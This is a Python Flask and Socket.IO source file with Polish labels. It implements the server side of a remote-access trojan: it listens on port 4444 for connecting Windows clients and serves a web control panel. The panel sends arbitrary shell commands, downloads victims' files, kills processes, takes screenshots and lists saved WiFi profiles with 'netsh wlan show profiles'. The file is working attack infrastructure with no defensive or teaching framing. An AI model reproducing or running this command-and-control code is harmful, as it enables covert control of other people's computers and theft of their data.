from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import socket
import threading
import time
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'tajny_klucz!'
socketio = SocketIO(app, cors_allowed_origins="*")

HOST = '0.0.0.0'
PORT = 4444
WEB_PORT = 5000

clients = {}

# ===== TRASA STRONY GŁÓWNEJ =====
@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Zarządzania</title>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #e0e0e0; display: flex; height: 100vh; }
        
        /* SIDEBAR */
        .sidebar { width: 300px; background: #1a1a1a; border-right: 1px solid #333; display: flex; flex-direction: column; }
        .sidebar h2 { padding: 20px; background: #111; color: #00ff88; text-align: center; font-size: 20px; border-bottom: 2px solid #00ff88; }
        .client-list { flex: 1; overflow-y: auto; padding: 10px; }
        .client-card { background: #222; border: 1px solid #333; border-radius: 8px; padding: 15px; margin-bottom: 10px; cursor: pointer; transition: all 0.3s; }
        .client-card:hover { border-color: #00ff88; transform: translateY(-2px); }
        .client-card.active { border-color: #00ff88; box-shadow: 0 0 15px rgba(0,255,136,0.2); }
        .client-card .ip { font-size: 16px; font-weight: bold; color: #00bcd4; }
        .client-card .os { font-size: 12px; color: #888; margin-top: 5px; }
        .status-indicator { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: #00ff00; margin-right: 8px; }
        
        /* MAIN */
        .main { flex: 1; display: flex; flex-direction: column; }
        .tabs { display: flex; background: #111; border-bottom: 1px solid #333; }
        .tab { padding: 15px 25px; cursor: pointer; border-bottom: 3px solid transparent; transition: all 0.3s; font-weight: bold; }
        .tab:hover { background: #222; }
        .tab.active { border-bottom-color: #00ff88; color: #00ff88; }
        
        .content { flex: 1; padding: 20px; overflow-y: auto; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        /* SHELL */
        .shell-output { background: #000; color: #00ff00; font-family: 'Consolas', monospace; padding: 20px; border-radius: 5px; min-height: 400px; max-height: 500px; overflow-y: auto; white-space: pre-wrap; }
        .shell-input { display: flex; margin-top: 10px; gap: 10px; }
        .shell-input input { flex: 1; padding: 12px; background: #222; border: 1px solid #444; color: #fff; font-family: 'Consolas', monospace; font-size: 14px; border-radius: 5px; }
        .shell-input button { padding: 12px 25px; background: #00bcd4; color: #000; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; }
        
        /* BUTTONS */
        .btn { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: all 0.3s; margin: 5px; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        .btn-green { background: #4caf50; color: #fff; }
        .btn-blue { background: #2196f3; color: #fff; }
        .btn-red { background: #f44336; color: #fff; }
        .btn-orange { background: #ff9800; color: #fff; }
        .btn-purple { background: #9c27b0; color: #fff; }
        
        input[type="text"] { padding: 10px; background: #222; border: 1px solid #444; color: #fff; border-radius: 5px; width: 100%; margin: 5px 0; }
        
        .card { background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 20px; margin-bottom: 15px; }
        .card h3 { color: #00bcd4; margin-bottom: 15px; }
        
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .loading { animation: pulse 1.5s infinite; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2>🖥️ Panel Klientów</h2>
        <div class="client-list" id="clientList">
            <div style="text-align:center; padding:20px; color:#888;">Oczekiwanie na klientów...</div>
        </div>
    </div>
    
    <div class="main">
        <div class="tabs">
            <div class="tab active" onclick="switchTab('shell')">💻 Shell</div>
            <div class="tab" onclick="switchTab('files')">📁 Pliki</div>
            <div class="tab" onclick="switchTab('processes')">⚙️ Procesy</div>
            <div class="tab" onclick="switchTab('tools')">🔧 Narzędzia</div>
        </div>
        
        <div class="content">
            <!-- SHELL -->
            <div class="tab-content active" id="shellTab">
                <div class="shell-output" id="shellOutput">Połącz z klientem aby rozpocząć...</div>
                <div class="shell-input">
                    <input type="text" id="cmdInput" placeholder="Wpisz komendę..." onkeypress="if(event.key==='Enter') sendCommand()">
                    <button onclick="sendCommand()">▶ Wykonaj</button>
                </div>
            </div>
            
            <!-- FILES -->
            <div class="tab-content" id="filesTab">
                <div class="card">
                    <h3>📥 Pobierz plik</h3>
                    <input type="text" id="downloadPath" placeholder="C:\\Users\\user\\Desktop\\plik.txt">
                    <button class="btn btn-green" onclick="downloadFile()">📥 Pobierz</button>
                </div>
                <div class="card">
                    <h3>📤 Wyślij plik</h3>
                    <input type="file" id="uploadFile">
                    <button class="btn btn-orange" onclick="uploadFile()">📤 Wyślij</button>
                </div>
            </div>
            
            <!-- PROCESSES -->
            <div class="tab-content" id="processesTab">
                <div class="card">
                    <h3>🗑 Zabij proces</h3>
                    <input type="text" id="processName" placeholder="notepad.exe">
                    <button class="btn btn-red" onclick="killProcess()">🗑 Zabij</button>
                </div>
                <div class="card">
                    <button class="btn btn-blue" onclick="sendCommandSpecific('tasklist')">📋 Pobierz listę procesów</button>
                </div>
            </div>
            
            <!-- TOOLS -->
            <div class="tab-content" id="toolsTab">
                <button class="btn btn-green" onclick="startHTTP()">🌐 Uruchom serwer HTTP</button>
                <button class="btn btn-blue" onclick="takeScreenshot()">📸 Screenshot</button>
                <button class="btn btn-purple" onclick="sendCommandSpecific('netsh wlan show profiles')">🔑 Pokaż sieci WiFi</button>
                <button class="btn btn-orange" onclick="sendCommandSpecific('systeminfo')">🖥️ Informacje o systemie</button>
            </div>
        </div>
    </div>
    
    <script>
        const socket = io();
        let currentClient = null;
        
        socket.on('connect', () => console.log('Połączono z serwerem'));
        
        socket.on('new_client', (data) => {
            updateClientList(data);
        });
        
        socket.on('command_response', (data) => {
            document.getElementById('shellOutput').innerHTML += data.response + '\\n';
            document.getElementById('shellOutput').scrollTop = document.getElementById('shellOutput').scrollHeight;
        });
        
        function updateClientList(data) {
            const list = document.getElementById('clientList');
            if (list.querySelector('.loading')) list.innerHTML = '';
            
            const card = document.createElement('div');
            card.className = 'client-card';
            card.onclick = () => selectClient(data.id, card);
            card.innerHTML = `
                <span class="status-indicator"></span>
                <span class="ip">${data.ip}</span>
                <div class="os">${data.os}</div>
            `;
            list.appendChild(card);
        }
        
        function selectClient(id, card) {
            currentClient = id;
            document.querySelectorAll('.client-card').forEach(c => c.classList.remove('active'));
            card.classList.add('active');
            socket.emit('select_client', {id: id});
        }
        
        function sendCommand() {
            const cmd = document.getElementById('cmdInput').value;
            if (!cmd || !currentClient) return;
            
            document.getElementById('shellOutput').innerHTML += `>>> ${cmd}\\n`;
            socket.emit('command', {client_id: currentClient, command: cmd});
            document.getElementById('cmdInput').value = '';
        }
        
        function sendCommandSpecific(cmd) {
            document.getElementById('cmdInput').value = cmd;
            sendCommand();
        }
        
        function downloadFile() {
            const path = document.getElementById('downloadPath').value;
            socket.emit('download', {client_id: currentClient, path: path});
        }
        
        function uploadFile() {
            const file = document.getElementById('uploadFile').files[0];
            // Implementacja uploadu
        }
        
        function killProcess() {
            const proc = document.getElementById('processName').value;
            socket.emit('command', {client_id: currentClient, command: 'kill ' + proc});
        }
        
        function startHTTP() {
            socket.emit('command', {client_id: currentClient, command: 'http 8080'});
        }
        
        function takeScreenshot() {
            socket.emit('command', {client_id: currentClient, command: 'screenshot'});
        }
        
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            event.target.classList.add('active');
            document.getElementById(tab + 'Tab').classList.add('active');
        }
    </script>
</body>
</html>
'''

# ===== SOCKET.IO EVENTS =====
@socketio.on('command')
def handle_command(data):
    client_id = data['client_id']
    command = data['command']
    
    if client_id in clients:
        conn, _, _ = clients[client_id]
        try:
            conn.send(command.encode())
            time.sleep(0.5)
            response = conn.recv(4096).decode(errors='ignore')
            emit('command_response', {'response': response})
        except:
            emit('command_response', {'response': 'Błąd komunikacji'})

# ===== NASŁUCHIWANIE KLIENTÓW =====
def accept_clients():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        
        while True:
            conn, addr = s.accept()
            client_id = len(clients) + 1
            clients[client_id] = (conn, addr, "Windows")
            
            socketio.emit('new_client', {
                'id': client_id,
                'ip': f"{addr[0]}:{addr[1]}",
                'os': 'Windows'
            })

if __name__ == '__main__':
    threading.Thread(target=accept_clients, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=WEB_PORT, debug=False)
